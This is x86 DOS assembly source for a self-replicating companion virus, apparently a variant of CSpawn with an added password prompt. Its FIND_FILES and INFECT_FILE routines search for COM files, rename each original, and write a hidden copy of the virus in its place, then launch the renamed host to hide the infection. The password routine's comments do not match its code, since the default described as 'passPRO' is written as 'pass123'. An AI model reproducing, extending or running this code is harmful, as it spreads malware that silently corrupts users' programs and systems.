.model tiny
.code 
org 100h

CSpawn:
	; Generate the dynamic password before prompting the user
    CALL GenerateTempPassword     ; Call a new routine to generate TempPassword

    ; Prompt for password before continuing with execution
    CALL CheckPassword            ; Check password before proceeding

    ; If password is incorrect, it will terminate here and not proceed to execution

    MOV SP, offset FINISH + 100h
    MOV AH, 4AH
    MOV BX,SP
    MOV CL,4
    SHR BX,CL
    INC BX
    INT 21H

    MOV BX,2Ch
    MOV AX,[BX]
    MOV WORD PTR [PARAM_BLK],AX
    MOV AX,CS
    MOV WORD PTR [PARAM_BLK+4],AX
    MOV WORD PTR [PARAM_BLK+8],AX
    MOV WORD PTR [PARAM_BLK+12],AX

    MOV DX,offset REAL_NAME
    MOV BX,offset PARAM_BLK
    MOV AX,4B00h
    INT 21h
	
    CLI
    mov     bx,ax                   ;save return code here
    mov     ax,cs                   ;AX holds code segment
    mov     ss,ax                   ;restore stack first 
    mov     sp,(FINISH - CSpawn) + 200H
    sti                
    push    bx                
    mov     ds,ax                   ;Restore data segment
    mov     es,ax                   ;Restore extra segment
    mov     ah,1AH                  ;DOS set DTA function    
    mov     dx,80H                  ;put DTA at offset 80H      
    int     21H                
	
    call    FIND_FILES              ;Find and infect files
    pop     ax                      ;AL holds return value 
    mov     ah,4CH                  ;DOS terminate function     
    int     21H                     ;bye-bye

; The following routine searches for COM files and infects them
FIND_FILES:                
    mov     dx,OFFSET COM_MASK      ;search for COM files
    mov     ah,4EH                  ;DOS find first file function 
    xor     cx,cx                   ;CX holds all file attributes
FIND_LOOP:      
    int     21H                
    jc      FIND_DONE               ;Exit if no files found
    call    INFECT_FILE             ;Infect the file!
    mov     ah,4FH                  ;DOS find next file function 
    jmp     FIND_LOOP               ;Try finding another file
FIND_DONE:      ret                     ;Return to caller
    COM_MASK        db      '*.COM',0               ;COM file search mask

; This routine infects the file specified in the DTA.
INFECT_FILE:                
    mov     si,9EH                  ;DTA + 1EH                
    mov     di,OFFSET REAL_NAME     ;DI points to new name
INF_LOOP:       
    lodsb                           ;Load a character
    stosb                           ;and save it in buffer
    or      al,al                   ;Is it a NULL?
    jnz     INF_LOOP                ;If so then leave the loop
    mov     WORD PTR [di-2],'N'     ;change name to CON & add 0
    mov     dx,9EH                  ;DTA + 1EH
    mov     di,OFFSET REAL_NAME                
    mov     ah,56H                  ;rename original file
    int     21H
    jc      INF_EXIT                ;if can’t rename, already done

    mov     ah,3CH                  ;DOS create file function
    mov     cx,2                    ;set hidden attribute
    int     21H
    mov     bx,ax                   ;BX holds file handle
    mov     ah,40H                  ;DOS write to file function
    mov     cx,FINISH - CSpawn      ;CX holds virus length
    mov     dx,OFFSET CSpawn        ;DX points to CSpawn of virus
    int     21H                
    mov     ah,3EH                  ;DOS close file function
    int     21H
INF_EXIT:       ret

; Routine to generate the password before prompting the user
GenerateTempPassword proc near
    MOV AL, [REAL_NAME]        ; Load the first byte of the program name
    CMP AL, 0                  ; Compare it with 0 (empty string)
    JE  SetDefaultPassword     ; If empty, jump to set the default password

    ; Now that REAL_NAME is populated, set up the host name
    MOV SI, OFFSET REAL_NAME   ; Point to host name (program name)
    MOV DI, OFFSET TempPassword  ; Temporary buffer for generated password

    ; Add "pass" to the password
    MOV BYTE PTR [DI], 'p'       ; Add 'p'
    INC DI
    MOV BYTE PTR [DI], 'a'       ; Add 'a'
    INC DI
    MOV BYTE PTR [DI], 's'       ; Add 's'
    INC DI
    MOV BYTE PTR [DI], 's'       ; Add 's'
    INC DI

    ; Copy the first 3 characters of the host name to the password
    MOV CX, 3                    ; We need only 3 characters from the filename
CopyHostNameChars:
    MOV AL, [SI]                 ; Load character from host name
    MOV [DI], AL                 ; Store it in the temporary password
    INC SI                       ; Move to next character in host name
    INC DI                       ; Move to next position in password
    LOOP CopyHostNameChars       ; Repeat for 3 characters

    ; Null-terminate the dynamically created password
    MOV BYTE PTR [DI], 0
    RET

SetDefaultPassword:
    ; If REAL_NAME is empty, set the password to "passPRO"
    MOV DI, OFFSET TempPassword
    MOV BYTE PTR [DI], 'p'
    INC DI
    MOV BYTE PTR [DI], 'a'
    INC DI
    MOV BYTE PTR [DI], 's'
    INC DI
    MOV BYTE PTR [DI], 's'
    INC DI
    MOV BYTE PTR [DI], '1'
    INC DI
    MOV BYTE PTR [DI], '2'
    INC DI
    MOV BYTE PTR [DI], '3'
    INC DI

    ; Null-terminate the password
    MOV BYTE PTR [DI], 0
    RET
GenerateTempPassword endp

; Routine to check the password input from the user
CheckPassword proc near
    ; Set up the prompt for the password
    MOV DX, offset PromptPassword
    MOV AH, 09h
    INT 21h                     ; Display prompt

    ; Set up buffer for user input
    MOV DX, offset PasswordBuffer
    MOV AH, 0Ah                  ; DOS function to read input
    INT 21h

    ; Now compare the dynamically generated password with the user input
    MOV SI, offset TempPassword  ; Point to the generated password
    MOV DI, offset PasswordBuffer + 2 ; Point to the input buffer (skip length byte)

    ; Compare character by character
CompareLoop:
    MOV AL, [SI]                 ; Load byte from generated password
    MOV BL, [DI]                 ; Load byte from input buffer
    CMP AL, BL                   ; Compare the characters
    JNE PasswordIncorrect        ; If different, jump to incorrect password handler

    INC SI                       ; Move to next character in generated password
    INC DI                       ; Move to next character in input buffer
    CMP BYTE PTR [SI], 0         ; Check if we have reached the end of the password
    JZ PasswordCorrect           ; If passwords match, proceed to the next step
    JNZ CompareLoop              ; Otherwise, keep comparing

PasswordIncorrect:
    ; If the password is incorrect, display error and exit
    MOV DX, offset IncorrectPasswordMsg
    MOV AH, 09h
    INT 21h

    MOV AH, 4Ch                  ; DOS terminate function
    INT 21h

PasswordCorrect:
    ; If password is correct, return to CSpawn to continue execution
	 ; Output newline before the success message to avoid mixing buffer with message
    MOV AH, 0Eh         ; Teletype output function (print char)
    MOV AL, 0Dh         ; Carriage return (CR)
    INT 10h             ; BIOS interrupt to print CR

    MOV AH, 0Eh         ; Teletype output function (print char)
    MOV AL, 0Ah         ; Line feed (LF)
    INT 10h             ; BIOS interrupt to print LF

    ; Now print the correct password message
    MOV DX, offset CorrectPasswordMsg
    MOV AH, 09h
    INT 21h
	
	MOV AH, 0Eh         ; Teletype output function (print char)
    MOV AL, 0Dh         ; Carriage return (CR)
    INT 10h             ; BIOS interrupt to print CR

    MOV AH, 0Eh         ; Teletype output function (print char)
    MOV AL, 0Ah         ; Line feed (LF)
    INT 10h             ; BIOS interrupt to print LF
    RET
CheckPassword endp

; Temporary buffer for the generated password
TempPassword db 8, 0, 8 dup (?)  ; Buffer for dynamically generated password (max 8 characters)

PasswordBuffer db 16, 0, 16 dup (?) ; Buffer for user input (max 16 characters)

PromptPassword db 'Enter password: $'
IncorrectPasswordMsg db 'Incorrect password...$'
CorrectPasswordMsg db 'Correct password!$'

REAL_NAME       db      13 dup (?)              ;Name of host to execute

; DOS EXEC function parameter block
PARAM_BLK       DW      ?                       ; Environment segment
                 DD      80H                     ; @ of command line
                 DD      5CH                     ; @ of first FCB
                 DD      6CH                     ; @ of second FCB

FINISH:
    end     CSpawn